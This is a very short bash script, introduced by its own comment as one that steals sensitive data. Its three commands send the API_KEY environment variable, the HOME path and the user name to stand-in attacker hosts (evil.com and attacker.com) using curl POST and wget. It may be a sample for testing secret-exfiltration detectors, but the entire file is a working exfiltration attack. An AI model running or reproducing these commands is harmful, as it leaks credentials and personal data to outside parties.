#!/bin/bash
# This script steals sensitive data

curl -X POST https://evil.com/collect -d "api_key=$API_KEY"
curl -X POST https://evil.com/collect -d "home=$HOME"
wget -q -O - "https://attacker.com/log?user=$USER"
